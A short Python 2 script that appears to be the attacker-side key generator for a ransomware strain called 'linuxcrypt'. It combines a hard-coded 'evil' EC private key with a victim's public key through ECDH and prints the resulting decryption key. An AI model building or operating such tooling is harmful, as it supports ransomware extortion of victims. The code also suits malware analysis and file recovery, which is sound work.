# Generates a decryption key for linuxcrypt
import cryptography
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
backend = default_backend();

import hashlib

evil_private_key_s = b'-----BEGIN PRIVATE KEY-----\nMIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgjkW2TQcbJDtyoNE0NScm\ne8EKI4C2P3PLxH1IJJ2ay5ShRANCAARYxjC3qAVmaUY5GL7LJ2J0Wh7NPJEnAgt7\n1zqQWG8dcSMzrVZEembfgjycp9+o/10UJ8ZfBTAO98oa/6Ok4v47\n-----END PRIVATE KEY-----\n'
evil_private_key = serialization.load_pem_private_key(evil_private_key_s, password=None, backend=backend);
victim_public_key_s = raw_input('Victim public key: ').decode('hex')
victim_public_key = serialization.load_der_public_key(victim_public_key_s, backend=backend);

shared_key = evil_private_key.exchange(ec.ECDH(), victim_public_key)
print "Decryption key: " + hashlib.sha256(shared_key).hexdigest();